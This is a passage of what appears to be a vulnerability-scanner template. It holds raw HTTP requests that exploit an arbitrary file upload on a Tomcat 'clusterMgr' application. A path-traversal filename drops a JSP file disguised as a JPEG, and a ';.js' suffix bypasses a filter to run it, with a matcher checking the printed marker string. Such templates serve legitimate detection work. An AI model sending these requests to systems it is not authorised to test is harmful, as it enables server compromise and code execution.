        ------WebKitFormBoundaryxxmdzwoe
        Content-Disposition: form-data; name="upload";filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/ukgmfyufsi.jsp"
        Content-Type:image/jpeg

        <%out.println("pboyjnnrfipmplsukdeczudsefxmywe");%>
        ------WebKitFormBoundaryxxmdzwoe--
  - raw:
      - |
        GET /clusterMgr/ukgmfyufsi.jsp;.js HTTP/1.1
        Host: {{Hostname}}
        
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'pboyjnnrfipmplsukdeczudsefxmywe'
